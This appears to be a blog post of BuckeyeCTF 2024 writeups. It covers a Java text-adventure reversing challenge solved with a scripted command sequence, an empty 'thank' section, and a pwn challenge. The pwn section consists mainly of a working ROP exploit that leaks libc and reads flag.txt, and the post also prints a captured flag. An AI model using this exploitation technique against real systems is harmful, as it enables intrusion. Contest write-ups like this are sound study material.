---
layout: post
title: BuckeyeCTF 2024 Writeups
date: 2024-09-30 04:04:06 -0400
categories: ctf writeup
---

{{ page.title }}
================

<p class="meta">September 30 2024 - CTF Writeup</p>

# CTFs

So, I do a lot of CTFs. I've always wanted to do writeups, and always found excuses not to. It's time to start making them. So I'm making some. Let's have fun! 

This time, I've been doing BuckeyeCTF. Here are writeups for 3 challenges that I did. 

# rev/text-adventure
## I just wrote a text adventure game after learning Java, but maybe I should've added some instructions....
## Author: kanderoo

 `nc challs.pwnoh.io 13376`

This one is a beginner rev challenge. It was a good exercise to get my brain into gear and in rev mode.   

## Step 1

Upon downloading the [zip]({{ site.baseurl }}/assets/ctf/buckeyeCTF-2024/rev/text-adventure/text-adventure.zip), I see a jar file, a flag file, a Dockerfile, and a docker-compose.yaml. My first instinct as soon as I see a .jar file is to toss it in [JD-GUI](http://java-decompiler.github.io/). Yes, there are better apps, and there are implementations in rev programs. But, JD-GUI does the work.

## Step 2
Looking at the decompilation, there is no obfuscation. It's pretty clear cut. 
![JD-GUI main]({{ site.baseurl }}/assets/ctf/buckeyeCTF-2024/rev/text-adventure/images/JD-GUI main.png)
Going through all the "room" java classes, I start by looking for anything interesting or unique. The number of files to look through and the lack of obfuscation makes this method the easiest. 

## Step 3
Oh Hi `DeadEnd.class`! You're not a deadend after all! 

![DeadEnd.class]({{ site.baseurl }}/assets/ctf/buckeyeCTF-2024/rev/text-adventure/images/DeadEnd.class.png)

It's clear that the goal is to play the game through and reach a state where we can enter the dead end, and then type "reach through the crack in the rocks", and then "the crack in the rocks concealing the magical orb with the flag". This will call the `printFlag()` method of the `MagicOrb` class, which looks like this

```java
public void printFlag() throws IOException {  
    BufferedReader br = new BufferedReader(new FileReader("/flag"));  
    String line;  
    while ((line = br.readLine()) != null)  
      System.out.println(line);   
    br.close();  
  }
```

So, let's trace back what we need to do further. We could do dynamic analysis using Frida to trace the steps back, but again, we don't have many files to look through.

## Step 4
I'm going to concatenate some of my reverse engineering process here. It's just looking at code and walking backwards from getting the flag to entering the game. Currently, the process (and what we know) is this:

`??? -> DeadEnd -> MagicOrb -> flag`

To get to the `DeadEnd` class, we need to call the `unlock()` method in `SealedDoor.class`, but also need to obtain the key. There is a `Player.instance.hasItem("key")` check. We also need a torch to avoid the `darkRoom()` prompt in `StairwayTop.class`.

Now, our process looks like this

`??? -> EntryHall -> StairwayTop (Needs torch) -> StairwayBottom -> SealedDoor (Needs key) -> DeadEnd -> MagicOrb -> flag`

So we need the torch and key. I'm assuming we also need the sword and rope items, so we'll walk through acquiring those too. The closest items to obtain are the torch and rope, so let's build our first part of the commands needed to obtain those two.

Looking at the code, we start at `CaveEnterance.class` (nice typo btw). From there, we can enter, grab the torch, and quickly get the rope from `CrystalRoom.class`.

So, our steps so far are 
```
enter
grab torch
go right
cross
grab rope
go back
go back
```
This brings us back to the `EntryHall.class` state with the torch and rope obtained. We now have the torch for `StairwayTop.class`, but need the key still.

`??? -> EntryHall -> StairwayTop (We now have the torch!) -> StairwayBottom -> SealedDoor (Needs key) -> DeadEnd -> MagicOrb -> flag`

## Step 5
To get the key, we need to be in the `KeyRoom.class` state (duh). This is reached through `SpiderHallway.class`, in which passing through requires the sword (magic webs can't be burned by torches :D). So, let's get the sword so we can get the key. 

Cutting out some explanation, to get to the sword, we need to be in the `AcrossRiver.class`. Adding the process for obtaining the sword is added to the next steps.

```
enter
grab torch
go right
cross
grab rope
go back
go back
go middle
go down
go right
use the rope
pick up sword
go back
go back
go back
go back
```
Now we are back in `EntryHall.class` with the torch, rope, and sword. We need the key now! 

## Step 6
Following the same steps to get our key.
```
enter
grab torch
go right
cross
grab rope
go back
go back
go middle
go down
go right
use the rope
pick up sword
go back
go back
go back
go back
go left
cut
pick up key
go back
go back
```

And now we have all the items needed to hit our `DeadEnd.class`
From the `EntryHall.class`, we perform these tasks.
```
go middle
descend
go left
unlock door
reach through the crack in the rocks
the crack in the rocks concealing the magical orb with the flag
```
On our local program, we can combine all the steps and test them! 
```
enter
grab torch
go right
cross
grab rope
go back
go back
go middle
go down
go right
use the rope
pick up sword
go back
go back
go back
go back
go left
cut
pick up key
go back
go back
go middle
descend
go left
unlock door
reach through the crack in the rocks
the crack in the rocks concealing the magical orb with the flag
```

## Step 7

I don't want to do this manually though, so we can make pwntools do it for us. 

```python
from pwn import *

r = remote("challs.pwnoh.io", 13376)

inputs = b"""
enter
take torch
go right
cross
grab rope
go back
go back
go middle
descend
go right
use rope
take sword
go back
go back
go back
go back
go left
cut the webs
take key
go back
go back
go middle
descend
go left
unlock door
reach through the crack in the rocks
the crack in the rocks concealing the magical orb with the flag"""

for line in inputs.splitlines():
    line = line.strip()
    if len(line) == 0:
        continue
    print(r.recvuntil(b'>').decode())
    r.sendline(line)

r.interactive()
```

Executing this script will give us the flag!

`bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_df1249643580a690}`

# rev/thank

## I am so grateful for your precious files!
## Author: gsemaj
 `nc challs.pwnoh.io 13373`

# pwn/no-handouts
## I just found a way to kill ROP. I think. Maybe?
## Author: corgo

 `nc challs.pwnoh.io 13371`

This time, we have a [zipfile]({{ site.baseurl }}/assets/ctf/buckeyeCTF-2024/pwn/no-handouts/no-handouts.zip) contianing a binary and it's dependencies, as well as the standard docker and fake flag files. 

## Step 1

First off, let's take a look at the binary. Running `checksec` on it, we see that it's a 64-bit binary with NX, PIE, and RELRO enabled. 


```python
from pwn import *

context.binary = ELF('chall')

libc = ELF("libc.so.6")
io = remote('challs.pwnoh.io', 13371)

io.recvuntil(b"it's at ")
system_addr = int(io.recvline().strip(), 16)
libc.address = system_addr - libc.symbols["system"]

rop = ROP(libc)
flag_buff = libc.bss()

rop.gets(flag_buff)
rop.open(flag_buff, 0)
rop.sendfile(1, 3, 0, 50)

io.sendline(b'a' * 40 + rop.chain())
io.sendlineafter(b"else", b"flag.txt")
io.interactive()
```